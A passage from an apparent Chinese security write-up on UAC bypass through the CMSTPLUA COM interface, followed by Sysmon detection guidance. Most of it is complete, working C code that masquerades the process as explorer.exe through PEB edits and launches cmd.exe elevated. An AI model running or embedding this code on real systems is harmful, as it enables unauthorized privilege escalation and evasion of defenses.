            USHORT SafeThunkCall : 1;
            USHORT InDebugPrint : 1;
            USHORT HasFiberData : 1;
            USHORT SkipThreadAttach : 1;
            USHORT WerInShipAssertCode : 1;
            USHORT RanProcessInit : 1;
            USHORT ClonedThread : 1;
            USHORT SuppressDebugMsg : 1;
            USHORT DisableUserStackWalk : 1;
            USHORT RtlExceptionAttached : 1;
            USHORT InitialThread : 1;
            USHORT SpareSameTebBits : 1;
        };
    };

    PVOID TxnScopeEnterCallback;
    PVOID TxnScopeExitCallback;
    PVOID TxnScopeContext;
    ULONG LockCount;
    ULONG SpareUlong0;
    PVOID ResourceRetValue;
} TEB, * PTEB;

typedef VOID(NTAPI* PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION)(
    _In_    PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_    PVOID Context,
    _Inout_ BOOLEAN* StopEnumeration
    );

typedef PVOID NTAPI RTLINITUNICODESTRING(
    _Inout_	PUNICODE_STRING DestinationString,
    _In_opt_ PCWSTR SourceString
);
typedef RTLINITUNICODESTRING FAR* LPRTLINITUNICODESTRING;
LPRTLINITUNICODESTRING			RtlInitUnicodeString;

typedef NTSTATUS NTAPI RTLENTERCRITICALSECTION(
    _In_ PRTL_CRITICAL_SECTION CriticalSection
);
typedef RTLENTERCRITICALSECTION FAR* LPRTLENTERCRITICALSECTION;
LPRTLENTERCRITICALSECTION			RtlEnterCriticalSection;

typedef NTSTATUS NTAPI RTLLEAVECRITICALSECTION(
    _In_ PRTL_CRITICAL_SECTION CriticalSection
);
typedef RTLLEAVECRITICALSECTION FAR* LPRTLLEAVECRITICALSECTION;
LPRTLLEAVECRITICALSECTION			RtlLeaveCriticalSection;

typedef NTSTATUS NTAPI LDRENUMERATELOADEDMODULES(
    _In_opt_ ULONG Flags,
    _In_ PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION CallbackFunction,
    _In_opt_ PVOID Context);
typedef LDRENUMERATELOADEDMODULES FAR* LPLDRENUMERATELOADEDMODULES;
LPLDRENUMERATELOADEDMODULES			LdrEnumerateLoadedModules;

typedef NTSTATUS NTAPI NTALLOCATEVIRTUALMEMORY(
    _In_        HANDLE ProcessHandle,
    _Inout_     PVOID* BaseAddress,
    _In_        ULONG_PTR ZeroBits,
    _Inout_     PSIZE_T RegionSize,
    _In_        ULONG AllocationType,
    _In_        ULONG Protect
);
typedef NTALLOCATEVIRTUALMEMORY FAR* LPNTALLOCATEVIRTUALMEMORY;
LPNTALLOCATEVIRTUALMEMORY	NtAllocateVirtualMemory;

LPWSTR g_lpszExplorer2 = (LPWSTR)L"C:\\windows\\explorer.exe";

VOID NTAPI supxLdrEnumModulesCallback(
    _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_ PVOID Context,
    _Inout_ BOOLEAN* StopEnumeration
)
{
    PPEB Peb = (PPEB)Context;

    if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {
        RtlInitUnicodeString(&DataTableEntry->FullDllName, g_lpszExplorer2);
        RtlInitUnicodeString(&DataTableEntry->BaseDllName, L"explorer.exe");
        *StopEnumeration = TRUE;
    }
    else {
        *StopEnumeration = FALSE;
    }
}


__inline struct _PEB* NtCurrentPeb() { return NtCurrentTeb()->ProcessEnvironmentBlock; }


VOID supMasqueradeProcess(
    VOID
)
{

    NTSTATUS Status;
    PPEB    Peb = NtCurrentPeb();
    SIZE_T  RegionSize;

    PVOID g_lpszExplorer = NULL;
    RegionSize = 0x1000;

    Status = NtAllocateVirtualMemory(
        NtCurrentProcess(),
        &g_lpszExplorer,
        0,
        &RegionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (NT_SUCCESS(Status)) {
        RtlEnterCriticalSection(Peb->FastPebLock);

        RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, g_lpszExplorer2);
        RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, g_lpszExplorer2);

        RtlLeaveCriticalSection(Peb->FastPebLock);

        LdrEnumerateLoadedModules(0, &supxLdrEnumModulesCallback, (PVOID)Peb);
    }
}

HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, __out void** ppv)
{

    BIND_OPTS3 bo;
    WCHAR  wszCLSID[50];
    WCHAR  wszMonikerName[300];
    CoInitialize(NULL);
    StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID) / sizeof(wszCLSID[0]));
    HRESULT hr = StringCchPrintfW(wszMonikerName, sizeof(wszMonikerName) / sizeof(wszMonikerName[0]), L"Elevation:Administrator!new:%s", wszCLSID);
    if (FAILED(hr))
        return hr;

    memset(&bo, 0, sizeof(bo));

    bo.cbStruct = sizeof(bo);
    bo.hwnd = hwnd;
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;

    return CoGetObject(wszMonikerName, &bo, riid, ppv);
}

BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable)
{
    HRESULT hr = 0;
    CLSID clsidICMLuaUtil = { 0 };
    IID iidICMLuaUtil = { 0 };
    ICMLuaUtil* CMLuaUtil = NULL;
    BOOL bRet = FALSE;


    CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
    IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

    CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
    hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);

    CMLuaUtil->lpVtbl->Release(CMLuaUtil);

    if (GetLastError())
    {
        return FALSE;
    }
    else {
        return TRUE;
    }
}
/*
int main() {
    CoInitialize(NULL);

    CMLuaUtilBypassUAC((LPWSTR)L"c:\\windows\\system32\\cmd.exe");
    CoUninitialize();
    return 0;
}*/
VOID  main()
{
    NtAllocateVirtualMemory = (LPNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    RtlEnterCriticalSection = (LPRTLENTERCRITICALSECTION)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlEnterCriticalSection");
    RtlInitUnicodeString = (LPRTLINITUNICODESTRING)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
    RtlLeaveCriticalSection = (LPRTLLEAVECRITICALSECTION)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlLeaveCriticalSection");
    LdrEnumerateLoadedModules = (LPLDRENUMERATELOADEDMODULES)GetProcAddress(GetModuleHandleA("ntdll.dll"), "LdrEnumerateLoadedModules");
    supMasqueradeProcess();
    CMLuaUtilBypassUAC((LPWSTR)L"c:\\windows\\system32\\cmd.exe");
    //CoUninitialize();

}

```

### 效果：

![image-20240726151134459](/img/BypssUAC_com组件CMSTPLUA_ICMLuaUtil接口提权/image-20240726151134459.png)

# 0x05 检测

这里我们拿sysmon日志举例，edr相关产品类似；

上面提权过程，无论是通过哪种方式实现的提权，远程注入也好rundll32也罢或者是进程伪装，都有存在的特性是：

- CMSTPLUA COM组件被调用用来创建一个新的进程（攻击者想要运行的进程）；

就会出现如下的一个进程创建日志：

![image-20240726152838470](/img/BypssUAC_com组件CMSTPLUA_ICMLuaUtil接口提权/image-20240726152838470.png)



这个行为的关键点就是，创建新进程的父进程是CMSTPLUA 这个com组件，反应到日志上就是，存在父进程的，以及父进程的运行参数；

父进程是``dllhost.exe``

父进程的参数包含：``{3E5FC7F9-9A51-4367-9063-A120244FBEC7}``(这个参数就是CMSTPLUA COM组件的guid，可以通过注册表查看到``HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\``)

```
ParentImage: C:\Windows\System32\dllhost.exe
ParentCommandLine: C:\Windows\system32\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}
```



![image-20240726154018527](/img/BypssUAC_com组件CMSTPLUA_ICMLuaUtil接口提权/image-20240726154018527.png)







